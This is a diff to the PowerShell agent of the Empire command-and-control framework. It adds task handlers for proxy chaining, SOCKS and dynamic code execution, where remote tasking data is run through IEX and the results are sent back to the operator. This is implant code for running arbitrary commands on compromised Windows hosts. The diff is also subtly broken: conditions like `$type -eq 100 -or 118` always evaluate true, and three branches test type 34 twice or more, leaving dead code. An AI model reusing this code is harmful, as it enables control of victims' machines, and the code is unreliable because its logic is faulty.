@@ -801,6 +801,12 @@ function Invoke-Empire {
                 (& $SendMessage -Packets $(Encode-Packet -type $type -data $msg -ResultID $ResultID));
                 exit;
             }
+
+            # set proxy chain
+            elseif($type -eq 34) {
+                Encode-Packet -type 0 -data '[!] Proxy chain not implemented' -ResultID $ResultID;
+            }
+
             # shell command
             elseif($type -eq 40) {
                 $parts = $data.Split(" ");
@@ -1039,15 +1045,25 @@ function Invoke-Empire {
                 }
             }
 
+            # socks proxy server
+            elseif($type -eq 34) {
+                Encode-Packet -type 0 -data '[!] SOCKS server not implemented' -ResultID $ResultID;
+            }
+
+            # socks proxy server data
+            elseif($type -eq 34) {
+                Encode-Packet -type 0 -data '[!] SOCKS server data not implemented' -ResultID $ResultID;
+            }
+
             # dynamic code execution, wait for output, don't save output
-            elseif($type -eq 100) {
+            elseif($type -eq 100 -or 118) {
                 $ResultData = IEX $data;
                 if($ResultData) {
                     Encode-Packet -type $type -data $ResultData -ResultID $ResultID;
                 }
             }
             # dynamic code execution, wait for output, save output
-            elseif($type -eq 101) {
+            elseif($type -eq 101 -or 119) {
                 # format- [15 chars of prefix][5 chars extension][data]
                 $prefix = $data.Substring(0,15);
                 $extension = $data.Substring(15,5);
@@ -1056,14 +1072,17 @@ function Invoke-Empire {
                 # send back the results
                 Encode-Packet -type $type -data ($prefix + $extension + (IEX $data)) -ResultID $ResultID;
             }
+
             # dynamic code execution, no wait, don't save output
-            elseif($type -eq 110) {
+            elseif($type -eq 110 -or 112) {
                 $jobID = Start-AgentJob $data;
                 $script:ResultIDs[$jobID]=$resultID;
                 Encode-Packet -type $type -data ("Job started: " + $jobID) -ResultID $ResultID;
             }
             # dynamic code execution, no wait, save output
-            elseif($type -eq 111) {
+            elseif($type -eq 111 -or 113) {
+                Encode-Packet -type 0 -data '[!] Dynamic code execution, no wait, save output not implemented' -ResultID $ResultID;
+
                 # Write-Host "'dynamic code execution, no wait, save output' not implemented!"
 
                 # format- [15 chars of prefix][5 chars extension][data]
@@ -1095,7 +1114,6 @@ function Invoke-Empire {
 
             elseif($type -eq 130) {
                 #Dynamically update agent comms
-
                 try {
                     IEX $data
 
